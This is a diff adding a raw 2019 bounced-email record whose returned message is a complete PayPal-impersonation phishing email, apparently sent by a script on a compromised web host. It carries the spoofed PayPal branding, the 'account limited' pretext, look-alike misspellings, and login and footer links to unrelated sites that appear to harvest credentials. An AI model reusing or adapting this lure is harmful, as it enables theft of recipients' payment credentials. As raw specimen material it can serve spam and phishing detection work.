@@ -1,0 +1,469 @@
+Return-Path: <>
+Delivered-To: tripplanner@gator3171.hostgator.com
+Received: from gator3171.hostgator.com
+	by gator3171.hostgator.com with LMTP id iLK+ELHSjly/yw8A8w4q4w
+	for <tripplanner@gator3171.hostgator.com>; Sun, 17 Mar 2019 18:05:21 -0500
+Return-path: <>
+Envelope-to: tripplanner@gator3171.hostgator.com
+Delivery-date: Sun, 17 Mar 2019 18:05:21 -0500
+Received: from gateway23.websitewelcome.com ([192.185.49.180]:31184)
+	by gator3171.hostgator.com with esmtps (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
+	(Exim 4.91)
+	id 1h5eqG-004MKT-PS
+	for tripplanner@gator3171.hostgator.com; Sun, 17 Mar 2019 18:05:21 -0500
+Received: by gateway23.websitewelcome.com (Postfix)
+	id 175749899; Sun, 17 Mar 2019 18:05:20 -0500 (CDT)
+Date: Sun, 17 Mar 2019 18:05:20 -0500 (CDT)
+From: MAILER-DAEMON@gateway23.websitewelcome.com (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+To: tripplanner@gator3171.hostgator.com
+Auto-Submitted: auto-replied
+MIME-Version: 1.0
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="86701965F.1552863920/gateway23.websitewelcome.com"
+Content-Transfer-Encoding: 8bit
+Message-Id: <20190317230520.175749899@gateway23.websitewelcome.com>
+X-Spam-Status: No, score=3.7
+X-Spam-Score: 37
+X-Spam-Bar: +++
+X-Spam-Flag: NO
+
+This is a MIME-encapsulated message.
+
+--86701965F.1552863920/gateway23.websitewelcome.com
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
+
+This is the mail system at host gateway23.websitewelcome.com.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<audreyaudrey46@yahoo.com>: host mta7.am0.yahoodns.net[66.218.85.52] said: 554
+    5.7.9 Message not accepted for policy reasons.  See
+    https://help.yahoo.com/kb/postmaster/SLN7253.html (in reply to end of DATA
+    command)
+
+--86701965F.1552863920/gateway23.websitewelcome.com
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; gateway23.websitewelcome.com
+X-Postfix-Queue-ID: 86701965F
+X-Postfix-Sender: rfc822; tripplanner@gator3171.hostgator.com
+Arrival-Date: Sun, 17 Mar 2019 18:05:19 -0500 (CDT)
+
+Final-Recipient: rfc822; audreyaudrey46@yahoo.com
+Original-Recipient: rfc822;audreyaudrey46@yahoo.com
+Action: failed
+Status: 5.7.9
+Remote-MTA: dns; mta7.am0.yahoodns.net
+Diagnostic-Code: smtp; 554 5.7.9 Message not accepted for policy reasons.  See
+    https://help.yahoo.com/kb/postmaster/SLN7253.html
+
+--86701965F.1552863920/gateway23.websitewelcome.com
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 8bit
+
+Return-Path: <tripplanner@gator3171.hostgator.com>
+Received: from cm13.websitewelcome.com (cm13.websitewelcome.com [100.42.49.6])
+	by gateway23.websitewelcome.com (Postfix) with ESMTP id 86701965F
+	for <audreyaudrey46@yahoo.com>; Sun, 17 Mar 2019 18:05:19 -0500 (CDT)
+Received: from gator3171.hostgator.com ([198.57.247.135])
+	by cmsmtp with SMTP
+	id 5eqChKLFSYTGM5eqDhXiHG; Sun, 17 Mar 2019 18:05:17 -0500
+X-Authority-Reason: ss=1
+Received: from tripplanner by gator3171.hostgator.com with local (Exim 4.91)
+	(envelope-from <tripplanner@gator3171.hostgator.com>)
+	id 1h5eqC-004MJ2-Nw
+	for audreyaudrey46@yahoo.com; Sun, 17 Mar 2019 18:05:16 -0500
+To: audreyaudrey46@yahoo.com
+Subject: PayPal
+X-PHP-Script: tripplanner.ge/dr.php for 192.254.186.169, 105.159.244.13
+From: PayPal <service@service.com>
+Reply-To: <service@service.com>
+Message-ID: <d5087104055b3e19468409c68db77e4b@tripplanner.ge>
+MIME-Version: 1.0
+Date: 2019-03-17
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - gator3171.hostgator.com
+X-AntiAbuse: Original Domain - yahoo.com
+X-AntiAbuse: Originator/Caller UID/GID - [1714 500] / [47 12]
+X-AntiAbuse: Sender Address Domain - gator3171.hostgator.com
+X-BWhitelist: no
+X-Source-IP: 
+X-Source-L: No
+X-Exim-ID: 1h5eqC-004MJ2-Nw
+X-Source: /opt/php56/bin/php-cgi
+X-Source-Args: /opt/php56/bin/php-cgi /home4/tripplanner/public_html/dr.php 
+X-Source-Dir: tripplanner.ge:/public_html
+X-Source-Sender: 
+X-Source-Auth: tripplanner
+X-Email-Count: 11
+X-Org: HG=hgshared;ORG=hostgator;
+X-Source-Cap: dHJpcHBsYW5uZXI7dHJpcHBsYW5uZXI7Z2F0b3IzMTcxLmhvc3RnYXRvci5jb20=
+X-Local-Domain: yes
+
+<HTML><HEAD><TITLE>google</TITLE>
+<META charset=utf-8>
+<META name=viewport content="width=device-width, initial-scale=1.0">
+<META name=format-detection content=telephone=no>
+<STYLE type=text/css>
+table th {
+	margin: 0 !important;
+	padding: 0 !important;
+	vertical-align: top;
+	font-weight: normal;
+}
+body {
+	margin: 0;
+	padding: 0;
+	font-family: Arial;
+	font-size: 16px;
+	color: #666666;
+}
+* {
+	line-height: normal !important;
+}
+/*Yahoo paragraph fix*/
+p {
+	margin: 1em 0;
+}
+/*This resolves the Outlook 07, 10, and Gmail td padding issue fix*/
+table td {
+	border-collapse: collapse;
+}
+/*viewport width scaling for all devices*/
+@-ms-viewport {
+width: device-width;
+}
+/*This resolves the issue when iphone puts links on dates, etc.*/
+.appleLinks {
+	color: inherit;
+	text-decoration: none;
+}
+.appleLinks a {
+	color: inherit;
+	text-decoration: none;
+}
+a[href^="x-apple-data-detectors:"] {
+	color: inherit;
+	text-decoration: inherit;
+}
+
+@media screen and (max-width:480px) {
+/*Do not show in mobiles*/
+*.nomobile, *[class~="hide"] {
+	display: none !important;
+}
+/*Shows in mobiles*/
+*.show {
+	display: block !important;
+	margin: 0 !important;
+	padding: 0 !important;
+	overflow: visible !important;
+	width: auto !important;
+	max-height: inherit !important;
+}
+.container {
+	width: 100% !important;
+	min-width: 100% !important;
+}
+.content {
+	width: 91.71428571428571% !important;
+}
+*[class~="logo"], *[class~="logo_right"] {
+	width: 50% !important;
+}
+*[class~="logo_top"] {
+	width: 108px !important;
+	height: 27px !important;
+}
+.coldrop {
+	display: block !important;
+	width: 100% !important;
+}
+.clearfix:before, .clearfix:after {
+	content: " ";
+	display: table;
+}
+.clearfix:after {
+	clear: both;
+}
+/*
+* For IE 6/7 only
+*/
+.clearfix {
+ *zoom: 1;
+}
+.imgfull {
+	width: 100% !important;
+	height: auto !important;
+}
+*[class~="padding_t10"] {
+	padding: 10px 0px 0px 0px !important;
+}
+*[class~="nopad"] {
+	padding: 0px 0px 0px 0px !important;
+}
+*[class~="dbl_line"] {
+	border-top: 1px solid #d9d9d9 !important;
+	border-bottom: 1px solid #FFFFFF !important;
+}
+/* text styles */
+
+*[class~="heading01"] {
+	font-size: 28px !important;
+}
+.text01 {
+	font-size: 12px !important;
+}
+.text02 {
+	font-size: 14px !important;
+}
+.text03 {
+	font-size: 16px !important;
+}
+.text04 {
+	font-size: 10px !important;
+}
+.arrange_top {
+	display: table-header-group !important;
+}
+.arrange_bottom {
+	display: table-footer-group !important;
+}
+.height20 {
+	height: 20px !important;
+}
+.height15 {
+	height: 15px !important;
+}
+.height10 {
+	height: 10px !important;
+}
+.height5 {
+	height: 5px !important;
+}
+.width20 {
+	width: 20px !important;
+}
+.width15 {
+	width: 15px !important;
+}
+.width10 {
+	width: 10px !important;
+}
+.width5 {
+	width: 5px !important;
+}
+}
+
+@media screen and (max-width:320px) {
+*[class~="logo"], *[class~="logo_right"] {
+	width: 70% !important;
+}
+}
+</STYLE>
+
+<META name=GENERATOR content="MSHTML 8.00.7601.17514"></HEAD>
+<BODY hotmail="fix"><!-- preheader -->
+<TABLE style="TABLE-LAYOUT: fixed" border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD vAlign=top align=middle>
+<TABLE style="MIN-WIDTH: 740px" class=container border=0 cellSpacing=0 cellPadding=0 width=740 bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD style="PADDING-BOTTOM: 10px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 10px" vAlign=center align=middle>
+<TABLE class=content border=0 cellSpacing=0 cellPadding=0 width=700 bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=center width="65%" align=left><STRONG></STRONG><BR></TD>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=center width="35%" align=right><A style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102)" href="http://www.coloradospringshousepainter.com/ShadowZ/Confirm/websc_signin/?country.x=MA&locale.x=fr_MA" et="_blank"><BR></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><!-- /preheader --><!-- main content -->
+<TABLE style="TABLE-LAYOUT: fixed" border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD vAlign=top align=middle>
+<TABLE style="MIN-WIDTH: 740px" class=container border=0 cellSpacing=0 cellPadding=0 width=740 bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD vAlign=center align=middle>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0 width=700 bgColor=#ffffff>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" class=grey_line height=1 vAlign=center align=left><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; BORDER-TOP: medium none; BORDER-RIGHT: medium none" class=hide alt="" src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/rnd_crnr_top.jpg" width=700 height=7></TD></TR>
+<TR>
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 1px; PADDING-RIGHT: 1px; FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px; PADDING-TOP: 0px" class=nopad bgColor=#e3e3e3 vAlign=center align=left>
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=top align=middle>
+<TABLE class=content border=0 cellSpacing=0 cellPadding=0 width=642>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" height=14><BR></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px">
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" align=left>
+<TABLE class=logo border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 16px"><A href="https://www.bcti.com/wp-content/plugins/showbiz/temp/update_extract/showbiz/ok.php" target=_blank><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; BORDER-TOP: medium none; BORDER-RIGHT: medium none" class=logo_top alt=PayPal src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/logo-paypal.png" width=140 height=34></A></TD></TR></TBODY></TABLE></TD>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" align=right>
+<TABLE class=logo_right border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 16px"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" class=height15 height=20><BR></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px">
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" align=left>
+<TABLE border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(26,26,26); FONT-SIZE: 42px" class=heading01><SPAN style="COLOR: rgb(0,156,222)">Your account has been limited !</SPAN><BR></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" height=15><BR></TD></TR>
+<TR>
+<TD style="LINE-HEIGHT: 1.3 !important; FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px" align=left>Dear user , </TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" height=10><BR></TD></TR>
+<TR>
+<TD style="LINE-HEIGHT: 1.3 !important; FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px" align=left><SPAN style="FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(102,102,102)"><BIG>Your account has been limited because we've noticed significant changes in your account activity.<BR>in order to take advantage of our services again login to your PayPal account and confirm your information .<BR><BR></BIG></SPAN><SPAN style="FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(102,102,102)"><SPAN style="FONT-WEIGHT: bold"><BIG>What to do next?<BR><BR></BIG></SPAN></SPAN><SPAN style="FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(102,102,102)"><BIG>Please log in to your PayPaI account and provide the requested information before<BR>November 24, 2017 through the account review. If we don't receive the information before<BR>this deadline or we notice additional significant changes in your account activity,<BR>your account access may be further Iimited. .</BIG></SPAN><BR><
+ /TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" class=height15 height=25><BR></TD></TR></TBODY></TABLE></TD></TR><!-- seperator --><!-- seperator ends-->
+<TR>
+<TD style="FONT-SIZE: 1px" height=20><BR></TD></TR><!-- seperator -->
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" bgColor=#e5e5e5 height=1><BR></TD></TR><!-- seperator ends-->
+<TR>
+<TD style="FONT-SIZE: 1px" height=20><BR></TD></TR>
+<TR>
+<TD style="TEXT-ALIGN: left; FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=top>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0 width=310>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: #666666; FONT-SIZE: 16px" vAlign=center width=5><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; BORDER-TOP: medium none; BORDER-RIGHT: medium none" alt="" src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/cta_blue_left.jpg" width=5 height=40></TD>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 16px; -moz-border-radius-topleft: 5px; -moz-border-radius-topright: 5px; -moz-border-radius-bottomright: 5px; -moz-border-radius-bottomleft: 5px" bgColor=#009cde vAlign=center>
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(255,255,255); FONT-SIZE: 13px" vAlign=center align=middle>
+<TABLE border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(255,255,255); FONT-SIZE: 13px" vAlign=center align=middle><A style="PADDING-BOTTOM: 10px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; COLOR: rgb(255,255,255); FONT-WEIGHT: bold; TEXT-DECORATION: none; PADDING-TOP: 10px" href="http://www.firstchog.info/cfgp111" target=_blank>Log in Now</A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD style="FONT-FAMILY: Arial; COLOR: #666666; FONT-SIZE: 16px" vAlign=center width=5><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; BORDER-TOP: medium none; BORDER-RIGHT: medium none" alt="" src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/cta_blue_right.jpg" width=5 height=40></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="FONT-SIZE: 1px" height=20><BR></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" bgColor=#e3e3e3 height=1 vAlign=center align=left><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; BORDER-TOP: medium none; BORDER-RIGHT: medium none" class=hide alt="" src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/rnd_crnr_bottom.jpg" width=700 height=7></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><!-- /main content --><!-- footer -->
+<TABLE style="TABLE-LAYOUT: fixed" border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD vAlign=top align=middle>
+<TABLE style="MIN-WIDTH: 740px" class=container border=0 cellSpacing=0 cellPadding=0 width=740 bgColor=#f2f2f2>
+<TBODY>
+<TR>
+<TD vAlign=center align=middle>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0 width=700>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" height=15><BR></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=center align=left>
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=top align=middle>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0 width=642>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px">
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TH style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px; VERTICAL-ALIGN: middle" class=coldrop vAlign=center align=left>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px; FONT-WEIGHT: bold" align=middle>
+<TABLE class=content border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TH style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px; FONT-WEIGHT: bold" class=coldrop align=middle><A style="COLOR: rgb(102,102,102); TEXT-DECORATION: none" href="https://www.bcti.com/wp-content/plugins/showbiz/temp/update_extract/showbiz/ok.php" target=_blank>Help</A><IMG style="LINE-HEIGHT: 0pt !important; DISPLAY: inline" class=width19 border=0 src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/spacer.png" width=15><A style="COLOR: rgb(102,102,102); TEXT-DECORATION: none" href="https://www.bcti.com/wp-content/plugins/showbiz/temp/update_extract/showbiz/ok.php" target=_blank>Contact</A><IMG style="LINE-HEIGHT: 0pt !important; DISPLAY: inline" class=width19 border=0 src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/spacer.png" width=15><A style="COLOR: rgb(102,102,102); TEXT-DECORATION: none" href="https://www.bcti.com/wp-content/plugins/showbiz/temp/update_extract/showbiz/ok.php" target=_blank>Security</A><IMG style="LINE
+ -HEIGHT: 0pt !important; DISPLAY: inline" class=width19 border=0 src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/spacer.png" width=15></TH>
+<TH style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px; FONT-WEIGHT: bold" class="coldrop padding_t10" align=middle><IMG style="LINE-HEIGHT: 0pt !important; DISPLAY: inline" class=hide border=0 src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/spacer.png" width=15></TH></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TH>
+<TH class=coldrop height=15><BR></TH>
+<TH class="coldrop dbl_line"><BR></TH>
+<TH class=coldrop height=15><BR></TH>
+<TH style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" class=coldrop align=right>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0 align=right>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px" align=middle>
+<TABLE border=0 cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px"><A href="https://www.bcti.com/wp-content/plugins/showbiz/temp/update_extract/showbiz/ok.php" target=_blank><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; COLOR: rgb(102,102,102); BORDER-TOP: medium none; BORDER-RIGHT: medium none" alt=facebook src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/fb_icon.png" width=20 height=20></A></TD>
+<TD><IMG style="LINE-HEIGHT: 0pt !important; DISPLAY: inline" border=0 src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/spacer.png" width=15></TD>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 13px"><A href="https://www.bcti.com/wp-content/plugins/showbiz/temp/update_extract/showbiz/ok.php" target=_blank><IMG style="BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; DISPLAY: block; COLOR: rgb(102,102,102); BORDER-TOP: medium none; BORDER-RIGHT: medium none" alt=twitter src="https://pp.images.harmony.epsilon.com/EMEA/2016/June/1175483/MENA/twitter_icon.png" width=20 height=20></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TH></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=center align=left>
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px" vAlign=top align=middle>
+<TABLE class=content border=0 cellSpacing=0 cellPadding=0 width=642>
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 12px">
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TH style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102)" class=coldrop align=left>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0><!-- TEMPLATE: HORIZONTAL RULE --><!-- TEMPLATE: SPOOF --><!-- / TEMPLATE: SPOOF --><!-- TEMPLATE: HORIZONTAL RULE --><!-- TEMPLATE: HORIZONTAL RULE --><!-- TEMPLATE: FOOTER -->
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: left; FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(102,102,102); FONT-SIZE: 11px">
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" height=19><BR></TD></TR>
+<TR>
+<TH style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102)" class=coldrop align=left>
+<TABLE class=container border=0 cellSpacing=0 cellPadding=0>
+<TBODY><!-- TEMPLATE: HORIZONTAL RULE --><!-- TEMPLATE: SPOOF -->
+<TR>
+<TD style="TEXT-ALIGN: left; FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(102,102,102); FONT-SIZE: 11px"><BR></TD></TR><!-- / TEMPLATE: SPOOF --><!-- TEMPLATE: HORIZONTAL RULE -->
+<TR>
+<TD><IMG style="DISPLAY: block" class=imgfull border=0 alt="" src="https://pp.images.harmony.epsilon.com/EMEA/2016/April/01161221/template_horizontal_rule.jpg" width=700 height=2></TD></TR><!-- TEMPLATE: HORIZONTAL RULE --><!-- TEMPLATE: FOOTER -->
+<TR>
+<TD style="TEXT-ALIGN: left; FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(102,102,102); FONT-SIZE: 11px">
+<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: left; PADDING-BOTTOM: 19px; LINE-HEIGHT: 19px; PADDING-LEFT: 29px; PADDING-RIGHT: 29px; FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(140,140,140); FONT-SIZE: 11px; PADDING-TOP: 19px"><SPAN style="TEXT-ALIGN: left; FONT-FAMILY: Helvetica,Arial,sans-serif; COLOR: rgb(140,140,140); FONT-SIZE: 11px"><SPAN class=appleLinks></SPAN></SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TH></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TH></TR><!-- footer --></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="FONT-FAMILY: Arial; COLOR: rgb(102,102,102); FONT-SIZE: 1px" height=15><BR></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><!-- footer --><IMG style="DISPLAY: none; MAX-HEIGHT: 0px; FONT-SIZE: 0px; OVERFLOW: hidden" src="https://epl.paypal-communication.com/O/v200000159741c8010b5df21369f35e926/874bd58fb7d8441f00004c5a42963aa1"></BODY></HTML>
+
+--86701965F.1552863920/gateway23.websitewelcome.com--
